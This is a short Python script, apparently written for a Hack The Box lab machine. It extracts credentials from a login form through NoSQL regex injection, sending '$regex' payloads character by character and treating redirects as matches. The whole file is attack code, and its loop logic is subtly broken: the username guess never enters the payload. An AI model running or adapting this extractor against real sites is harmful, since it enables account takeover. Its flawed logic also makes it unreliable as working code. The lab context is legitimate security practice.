import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username=""
password=""
u="http://staging-order.mango.htb/"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
	for i in string.printable:
		if i not in ['*','+','.','?','|', '&']:
			for c in string.printable:
				if c not in ['*','+','.','?','|', '&']:
					payload='username[$regex]=^%s&password[$regex]=^%s&login=login' % (username, password + c)
					r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
					if 'OK' in r.text or r.status_code == 302:
						print("Found one more user : %s" % (username+i))
						print("Found one more pass : %s" % (password+c))
						username += i
						password += c
